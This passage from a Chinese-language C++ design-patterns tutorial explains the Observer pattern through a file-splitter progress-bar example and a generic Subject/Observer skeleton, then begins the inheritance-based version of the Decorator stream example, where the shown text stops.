progressBar)</span></span>;<br><br>splitter.split();<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>以上实现，FileSplitter不能传入其它类型的进度条对象。不符合依赖倒置原则。</p><blockquote><p>高层模块(稳定)不应该依赖于低层模块(变化)，二者都应该依赖于抽象(稳定)。</p><p>抽象(稳定)不应该依赖于实现细节(变化)，实现细节应该依赖于抽象(稳定)。</p></blockquote><p>要改，就是将具体进度条对象，想办法变成一个抽象的父类对象。</p><p>方法二，使用observer，抽象一个IProgress基类对象，让FileSpliter依赖它。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// observer</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IProgress</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// update</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DoProgress</span><span class="hljs-params">(<span class="hljs-keyword">float</span> value)</span></span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">virtual</span> ~IProgress()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// subject</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileSplitter</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-built_in">string</span> m_filePath;<br><span class="hljs-keyword">int</span> m_fileNumber;<br><br>List&lt;IProgress*&gt;  m_iprogressList; <span class="hljs-comment">// 抽象通知机制，支持多个观察者</span><br><br><span class="hljs-keyword">public</span>:<br>FileSplitter(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; filePath, <span class="hljs-keyword">int</span> fileNumber) :<br>m_filePath(filePath), <br>m_fileNumber(fileNumber)&#123;...&#125;<br><br>    <span class="hljs-comment">// 调用notifier: 所有具体observer，更新状态，此处不依赖具体对象</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">split</span><span class="hljs-params">()</span></span>&#123;<br>...<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m_fileNumber; i++)&#123;<br>progressValue = (i + <span class="hljs-number">1</span>) / (<span class="hljs-keyword">float</span>)progressValue;<br>onProgress(progressValue); <span class="hljs-comment">//发送通知</span><br>&#125;<br>...<br>&#125;<br><br>    <span class="hljs-comment">// attach observer</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addIProgress</span><span class="hljs-params">(IProgress* iprogress)</span></span>&#123;<br>m_iprogressList.push_back(iprogress);<br>&#125;<br><br>    <span class="hljs-comment">// detach observer</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">removeIProgress</span><span class="hljs-params">(IProgress* iprogress)</span></span>&#123;<br>m_iprogressList.<span class="hljs-built_in">remove</span>(iprogress);<br>&#125;<br><br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-comment">// notify</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onProgress</span><span class="hljs-params">(<span class="hljs-keyword">float</span> value)</span></span>&#123;<br>List&lt;IProgress*&gt;::iterator itor=m_iprogressList.<span class="hljs-built_in">begin</span>();<br><br><span class="hljs-keyword">while</span> (itor != m_iprogressList.<span class="hljs-built_in">end</span>() )<br>(*itor)-&gt;DoProgress(value); <span class="hljs-comment">//调用observer更新进度条</span><br>itor++;<br>&#125;<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 一种具体observer</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConsoleObserver</span>:</span> <span class="hljs-keyword">public</span> IProgress &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DoProgress</span><span class="hljs-params">(<span class="hljs-keyword">float</span> value)</span></span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"."</span>;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">// 具体对象使用observer进行通知</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form, <span class="hljs-keyword">public</span> IProgress<br>&#123;<br>TextBox* txtFilePath;<br>TextBox* txtFileNumber;<br>ProgressBar* progressBar;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Button1_Click</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">string</span> filePath = txtFilePath-&gt;getText();<br><span class="hljs-keyword">int</span> number = atoi(txtFileNumber-&gt;getText().c_str());<br><br>        <span class="hljs-comment">// 具体observer</span><br>ConsoleObserver ob1;<br><br>        <span class="hljs-comment">// 具体subject </span><br><span class="hljs-function">FileSplitter <span class="hljs-title">splitter</span><span class="hljs-params">(filePath, number)</span></span>;<br><br>        <span class="hljs-comment">// 添加observer</span><br>splitter.addIProgress(<span class="hljs-keyword">this</span>); <span class="hljs-comment">//订阅通知</span><br>splitter.addIProgress(&amp;ob1)； <span class="hljs-comment">//订阅通知</span><br>            <br>        <span class="hljs-comment">// observer将根据subject状态的改变，更新自己状态</span><br>splitter.split();<br><br>splitter.removeIProgress(&amp;ob1);<br>splitter.removeIProgress(<span class="hljs-keyword">this</span>);<br>&#125;<br><br>    <span class="hljs-comment">// 在mainform中更新</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DoProgress</span><span class="hljs-params">(<span class="hljs-keyword">float</span> value)</span></span>&#123;<br>progressBar-&gt;setValue(value);<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>以上抽象出一个observer基类，由subject进行状态的传递，解耦了进度条对象大的设计。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/21/17-19-19-9088e9.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><ul><li><p>Subject（目标）—目标知道它的观察者。可以有任意多个观察者观察同一个目标。—提供注册和删除观察者对象的接口。</p></li><li><p>Observer（观察者）—为那些在目标发生改变时需获得通知的对象定义一个更新接口。</p></li><li><p>ConcreteSubject（具体目标）—将有关状态存入各ConcreteObserver对象。—当它的状态发生改变时,向它的各个观察者发出通知。</p></li><li><p>ConcreteObserver（具体观察者）—维护一个指向ConcreteSubject对象的引用。—存储有关状态，这些状态应与目标的状态保持一致。—实现Observer的更新接口以使自身状态与目标的状态保持一致。</p></li></ul><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Subject</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Observer</span><br><span class="hljs-comment"> * defines an updating interface for objects that should be notified</span><br><span class="hljs-comment"> * of changes in a subject</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Observer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Observer() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">( Subject *subject )</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Observer</span><br><span class="hljs-comment"> * stores state of interest to ConcreteObserver objects and</span><br><span class="hljs-comment"> * sends a notification to its observers when its state changes</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteObserver</span> :</span> <span class="hljs-keyword">public</span> Observer<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteObserver( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> state ) :<br>    observer_state( state ) &#123;&#125;<br>  <br>  ~ConcreteObserver() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> observer_state;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">( Subject *subject )</span></span>;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> observer_state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Subject</span><br><span class="hljs-comment"> * knows its observers and provides an interface for attaching</span><br><span class="hljs-comment"> * and detaching observers</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Subject</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Subject() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">attach</span><span class="hljs-params">( Observer *observer )</span></span><br><span class="hljs-function">  </span>&#123;<br>    observers.push_back(observer);<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">detach</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> index )</span></span><br><span class="hljs-function">  </span>&#123;<br>    observers.erase( observers.<span class="hljs-built_in">begin</span>() + index );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">notify</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; observers.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      observers.at( i )-&gt;update( <span class="hljs-keyword">this</span> );<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setState</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> s )</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Observer*&gt; observers;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Subject</span><br><span class="hljs-comment"> * stores state that should stay consistent with the subject's</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteSubject</span> :</span> <span class="hljs-keyword">public</span> Subject<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteSubject() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> subject_state;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setState</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> s )</span></span><br><span class="hljs-function">  </span>&#123;<br>    subject_state = s;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> subject_state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ConcreteObserver::update</span><span class="hljs-params">( Subject *subject )</span></span><br><span class="hljs-function"></span>&#123;<br>  observer_state = subject-&gt;getState();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Observer state updated."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function">ConcreteObserver <span class="hljs-title">observer1</span><span class="hljs-params">( <span class="hljs-number">1</span> )</span></span>;<br>  <span class="hljs-function">ConcreteObserver <span class="hljs-title">observer2</span><span class="hljs-params">( <span class="hljs-number">2</span> )</span></span>;<br>  <br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Observer 1 state: "</span> &lt;&lt; observer1.getState() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Observer 2 state: "</span> &lt;&lt; observer2.getState() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  Subject *subject = <span class="hljs-keyword">new</span> ConcreteSubject();<br>  subject-&gt;<span class="hljs-built_in">attach</span>( &amp;observer1 );<br>  subject-&gt;<span class="hljs-built_in">attach</span>( &amp;observer2 );<br>  <br>  subject-&gt;setState( <span class="hljs-number">10</span> );<br>  subject-&gt;notify();<br>  <br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Observer 1 state: "</span> &lt;&lt; observer1.getState() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Observer 2 state: "</span> &lt;&lt; observer2.getState() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  <span class="hljs-keyword">delete</span> subject;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="单一职责相关模式">单一职责相关模式</span></h2><p>在软件组件的设计中，如果责任划分的不清晰，使用继承得到的结果往往是随着需求的变化，子类急剧膨胀，同时充斥着重复代码，这时候的关键是划清责任。</p><p>典型模式</p><ul><li>Decorator</li><li>Bridge</li></ul><h3><span id="decorator">Decorator</span></h3><p>使用继承来扩展对象的功能，为类型引入的静态特质，使得这种扩展方式缺乏灵活性；并且随着子类的增多（扩展功能的增多），各种子类的组合（扩展功能的组合）会导致更多子类的膨胀。</p><p>动态（组合）地给一个对象增加一些额外的职责。就增加功能而言，Decorator模式比生成子类（继承）更为灵活（消除重复代码&amp; 减少子类个数）。</p><h4><span id="示例5">示例5</span></h4><p>设计一个数据流处理系统，后续在基础系统之上，扩展不同类型的流，以及增加加密、缓存功能。</p><p>实现一，使用类继承的方式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stream</span>&#123;</span><br><span class="hljs-keyword">public</span>：<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Stream</span>()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 2种流数据</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileStream</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;读文件流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;定位文件流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>&#123;写文件流&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkStream</span> :</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">Stream</span>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;读网络流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;定位网络流&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">char</span> data)</span></span>&#123;写网络流&#125;<br>&#125;;<br><br><span class="hljs-comment">// 扩展功能</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoFileStream</span> :</span><span class="hljs-keyword">public</span> FileStream&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        FileStream::Read(number);<span class="hljs-comment">//读文件流</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        FileStream::Seek(<span class="hljs-built_in">position</span>);<span class="hljs-comment">//定位文件流</span><br>        <span class="hljs-comment">//额外的加密操作...</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;<br>        <span class="hljs-comment">//额外的加密操作...</span><br>        FileStream::Write(data);<span class="hljs-comment">//写文件流</span><br>        <span class="hljs-comment">//额外的加密操作...</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoNetworkStream</span> :</span> :<span class="hljs-keyword">public</span> NetworkStream&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BufferedFileStream</span> :</span> <span class="hljs-keyword">public</span> FileStream&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BufferedNetworkStream</span> :</span> <span class="hljs-keyword">public</span> NetworkStream&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">char</span> <span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">position</span>)</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-keyword">byte</span> data)</span></span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CryptoBufferedFileStream</span> :</span><span class="hljs-keyword">public</span> 